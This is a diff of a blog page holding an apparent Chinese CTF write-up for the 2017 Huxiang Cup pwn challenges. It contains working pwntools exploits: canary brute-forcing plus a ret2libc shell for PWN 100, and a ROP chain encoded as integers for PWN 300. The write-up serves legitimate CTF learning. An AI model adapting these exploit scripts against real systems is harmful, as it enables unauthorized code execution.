@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="PWN,CTF," />
+  <meta name="keywords" content="CTF,PWN," />
 
 
 
@@ -80,7 +80,7 @@
 
 
 <meta name="description" content="PWN 100先分析下源码： 1234567891011121314151617181920212223242526272829303132333435363738394041int __cdecl main()&amp;#123;  char v1; // [esp+1Bh][ebp-5h]  __pid_t v2; // [esp+1Ch][ebp-4h]  setbuf(stdin, 0);  se">
-<meta name="keywords" content="PWN,CTF">
+<meta name="keywords" content="CTF,PWN">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2017湖湘杯pwn">
 <meta property="og:url" content="http://yoursite.com/2018/03/19/2017湘湖杯pwn/index.html">
@@ -97,7 +97,12 @@
 <meta property="og:image" content="http://yoursite.com/2018/03/19/2017湘湖杯pwn/8.png">
 <meta property="og:image" content="http://yoursite.com/2018/03/19/2017湘湖杯pwn/7.png">
 <meta property="og:image" content="http://yoursite.com/2018/03/19/2017湘湖杯pwn/9.png">
-<meta property="og:updated_time" content="2018-03-19T17:02:08.900Z">
+<meta property="og:image" content="http://yoursite.com/2018/03/19/2017湘湖杯pwn/10.png">
+<meta property="og:image" content="http://yoursite.com/2018/03/19/2017湘湖杯pwn/14.png">
+<meta property="og:image" content="http://yoursite.com/2018/03/19/2017湘湖杯pwn/11.png">
+<meta property="og:image" content="http://yoursite.com/2018/03/19/2017湘湖杯pwn/12.png">
+<meta property="og:image" content="http://yoursite.com/2018/03/19/2017湘湖杯pwn/13.png">
+<meta property="og:updated_time" content="2018-03-20T09:40:21.934Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2017湖湘杯pwn">
 <meta name="twitter:description" content="PWN 100先分析下源码： 1234567891011121314151617181920212223242526272829303132333435363738394041int __cdecl main()&amp;#123;  char v1; // [esp+1Bh][ebp-5h]  __pid_t v2; // [esp+1Ch][ebp-4h]  setbuf(stdin, 0);  se">
@@ -356,7 +361,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from base64 import *</span><br><span class="line"></span><br><span class="line">context_log_level = &apos;debug&apos;</span><br><span class="line">bin = ELF(&apos;pwns&apos;)</span><br><span class="line"></span><br><span class="line">libc=ELF(&apos;libc.so.6&apos;)</span><br><span class="line">puts_plt_addr = bin.plt[&apos;puts&apos;]</span><br><span class="line">puts_got_addr = bin.got[&apos;puts&apos;]</span><br><span class="line">vulc_addr = 0x080487E6</span><br><span class="line">p = process(&apos;./pwns&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = &apos;\x00&apos;</span><br><span class="line">p.recvuntil(&apos;May be I can know if you give me some data[Y/N]\n&apos;)</span><br><span class="line">for i in range(3):</span><br><span class="line"></span><br><span class="line">for j in range(256):</span><br><span class="line">    p.send(&apos;Y\n&apos;)</span><br><span class="line">    p.send(b64encode(&apos;a&apos;*257+ canary + chr(j)))</span><br><span class="line">    recv =p.recvuntil(&apos;May be I can know if you give me some data[Y/N]\n&apos;)</span><br><span class="line">    if &apos;Finish&apos; in recv:</span><br><span class="line">        canary += chr(j)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print &apos;find canary:&apos;+canary.encode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line">pay1 = &apos;a&apos;*257+ canary +&apos;a&apos;*12+flat(puts_plt_addr,vulc_addr,puts_got_addr)</span><br><span class="line">p.send(&apos;Y\n&apos;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Give me some datas:\n\n&apos;)</span><br><span class="line"></span><br><span class="line">p.send(b64encode(pay1))</span><br><span class="line"></span><br><span class="line">puts_addr = p.recv()[268:268+4]</span><br><span class="line"></span><br><span class="line">system_addr = libc.symbols[&apos;system&apos;] - libc.symbols[&apos;puts&apos;] + u32(puts_addr)</span><br><span class="line"></span><br><span class="line">sh_addr = next(libc.search(&apos;/bin/sh&apos;))- libc.symbols[&apos;puts&apos;] + u32(puts_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*257+canary+&apos;a&apos;*12+flat(system_addr,p32(1),sh_addr)</span><br><span class="line"></span><br><span class="line">p.send(b64encode(pay2))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>运行：</p>
 <img src="/2018/03/19/2017湘湖杯pwn/0.png">
-<h2 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn 200"></a>pwn 200</h2><p>分析源码，一个格式化字符串漏洞</p>
+<h2 id="PWN-200"><a href="#PWN-200" class="headerlink" title="PWN 200"></a>PWN 200</h2><p>分析源码，一个格式化字符串漏洞</p>
 <img src="/2018/03/19/2017湘湖杯pwn/8.png">
 <p>那么直接调试找偏移</p>
 <img src="/2018/03/19/2017湘湖杯pwn/7.png">
@@ -367,7 +372,18 @@
 <img src="/2018/03/19/2017湘湖杯pwn/9.png">
 <p>ps:关于<code>fmtstr_payload</code>的用法以及源码参考：</p>
 <p><a href="http://docs.pwntools.com/en/stable/fmtstr.html" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/fmtstr.html</a></p>
-
+<h2 id="PWN-300"><a href="#PWN-300" class="headerlink" title="PWN 300"></a>PWN 300</h2><p>存在栈溢出</p>
+<img src="/2018/03/19/2017湘湖杯pwn/10.png">
+<p>根据这里可以知道需要填充的padding长度</p>
+<img src="/2018/03/19/2017湘湖杯pwn/14.png">
+<p>另外这个程序时静态链接的，那么ROP就在程序自身找找</p>
+<img src="/2018/03/19/2017湘湖杯pwn/11.png">
+<p>还有就是这个程序只能输入无符号类型的10进制数</p>
+<img src="/2018/03/19/2017湘湖杯pwn/12.png">
+<p>那么就需要把shellcode修改一下</p>
+<p>最后编写exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">shellcode = (134671626, 135176288, 134984710, 1852400175, 134880685, 134671626, 135176292, 134984710, 1752379183, 134880685, 134671626, 135176296, 134563632, 134880685, 134513097, 135176288, 134671665, 135176296, 135176288, 134671626, 135176296, 134563632, 134723423, 134723423, 134723423, 134723423, 134723423, 134723423, 134723423, 134723423, 134723423, 134723423, 134723423, 134518657)</span><br><span class="line"></span><br><span class="line">payload = []</span><br><span class="line">padding = 16    #34+16+1</span><br><span class="line">for i in range(padding):</span><br><span class="line">	payload.append(i)</span><br><span class="line"></span><br><span class="line">for i in shellcode:</span><br><span class="line">	payload.append(i)</span><br><span class="line"></span><br><span class="line">p = process(&apos;pwn300&apos;)</span><br><span class="line"></span><br><span class="line">times = padding+len(shellcode)+1</span><br><span class="line">p.recvuntil(&apos;calculate:&apos;)</span><br><span class="line">p.sendline(str(times))</span><br><span class="line"></span><br><span class="line">for i in range(padding):</span><br><span class="line">	p.recvuntil(&apos;5 Save the result\n&apos;)</span><br><span class="line">	p.sendline(&apos;2&apos;)</span><br><span class="line">	p.recvuntil(&apos;input the integer x:&apos;)</span><br><span class="line">	p.sendline(&apos;0&apos;)</span><br><span class="line">	p.recvuntil(&apos;input the integer y:&apos;)</span><br><span class="line">	p.sendline(&apos;0&apos;)</span><br><span class="line">	p.recvuntil(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(padding,times-1):</span><br><span class="line">	p.recvuntil(&apos;5 Save the result\n&apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;input the integer x:&apos;)</span><br><span class="line">	p.sendline(str(payload[i]))</span><br><span class="line">	p.recvuntil(&apos;input the integer y:&apos;)</span><br><span class="line">	p.sendline(&apos;0&apos;)</span><br><span class="line">	p.recvuntil(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(&apos;5&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<img src="/2018/03/19/2017湘湖杯pwn/13.png">
       
     </div>
     
@@ -384,9 +400,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/PWN/" rel="tag"># PWN</a>
-          
             <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
           
         </div>
       
@@ -534,7 +550,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-100"><span class="nav-number">1.</span> <span class="nav-text">PWN 100</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-200"><span class="nav-number">2.</span> <span class="nav-text">pwn 200</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-100"><span class="nav-number">1.</span> <span class="nav-text">PWN 100</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-200"><span class="nav-number">2.</span> <span class="nav-text">PWN 200</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-300"><span class="nav-number">3.</span> <span class="nav-text">PWN 300</span></a></li></ol></div>
             
 
           </div>
